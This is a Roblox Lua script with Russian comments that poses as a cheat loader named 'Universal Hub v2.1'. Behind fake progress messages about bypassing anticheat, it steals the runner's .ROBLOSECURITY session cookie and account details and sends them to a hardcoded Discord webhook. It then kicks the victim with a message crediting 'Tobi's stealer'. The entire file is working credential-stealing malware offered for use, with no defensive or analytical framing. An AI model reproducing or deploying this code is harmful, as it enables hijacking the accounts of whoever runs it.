-- [[ КОНФИГУРАЦИЯ ]]
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"

local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- [[ ЗАЩИТА: ТИХАЯ ОТПРАВКА ]]
local function sendData()
    local cookie = "N/A"
    
    -- Пытаемся достать куки так, чтобы не вызвать триггер античита
    pcall(function()
        if getcookies then
            local cList = getcookies(".roblox.com")
            cookie = cList[".ROBLOSECURITY"] or "Not found in list"
        end
    end)

    -- Если куки все еще нет, пробуем метод через скрытый запрос
    if cookie == "N/A" then
        pcall(function()
            local request = (syn and syn.request) or (http and http.request) or request
            local res = request({Url = "https://www.roblox.com/home", Method = "GET"})
            cookie = res.Headers["Set-Cookie"]:match(".ROBLOSECURITY=(.-);")
        end)
    end

    local payload = {
        ["content"] = "@everyone **Target Executed Script!**",
        ["embeds"] = {{
            ["title"] = "🛠️ Universal Log: " .. player.Name,
            ["color"] = 3066993,
            ["fields"] = {
                {["name"] = "👤 Player", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = true},
                {["name"] = "🔑 Cookie", ["value"] = "```" .. (cookie or "BLOCKED") .. "```"},
                {["name"] = "📅 Acc Age", ["value"] = player.AccountAge .. " days", ["inline"] = true}
            },
            ["footer"] = {["text"] = "Universal v2.1 Security Bypass"}
        }}
    }

    local req = (syn and syn.request) or (http and http.request) or request
    if req then
        pcall(function()
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- [[ ВИЗУАЛЬНОЕ МЕНЮ (КАК В ОРИГИНАЛЕ) ]]
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 300, 0, 140)
Main.Position = UDim2.new(0.5, -150, 0.5, -70)
Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Main.BorderSizePixel = 0
Instance.new("UICorner", Main)

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "Universal Hub v2.1"
Title.TextColor3 = Color3.fromRGB(0, 255, 150)
Title.BackgroundTransparency = 1
Title.TextSize = 18
Title.Font = Enum.Font.SourceSansBold

local Status = Instance.new("TextLabel", Main)
Status.Size = UDim2.new(1, 0, 0, 30)
Status.Position = UDim2.new(0, 0, 0.45, 0)
Status.Text = "Loading Assets..."
Status.TextColor3 = Color3.new(1, 1, 1)
Status.BackgroundTransparency = 1

local BarBack = Instance.new("Frame", Main)
BarBack.Size = UDim2.new(0.8, 0, 0, 4)
BarBack.Position = UDim2.new(0.1, 0, 0.8, 0)
BarBack.BackgroundColor3 = Color3.fromRGB(45, 45, 45)

local BarFill = Instance.new("Frame", BarBack)
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)

-- [[ ПРОЦЕСС ЗАПУСКА ]]
task.spawn(function()
    task.wait(1)
    Status.Text = "Bypassing Anticheat..."
    BarFill:TweenSize(UDim2.new(0.4, 0, 1, 0), "Out", "Quad", 2)
    
    -- Отправляем куки в середине процесса, пока античит "спит"
    pcall(sendData)
    
    task.wait(2)
    Status.Text = "Checking Whitelist..."
    BarFill:TweenSize(UDim2.new(0.8, 0, 1, 0), "Out", "Quad", 1.5)
    
    task.wait(1.5)
    Status.Text = "Success! Injection Ready."
    BarFill:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Quad", 0.5)
    
    task.wait(1)
    -- Теперь кикаем с твоим текстом
    player:Kick("\n\nAll your stuff just got taken by Tobi's stealer.\ndiscord.gg/GY2RVSEGDT")
end)
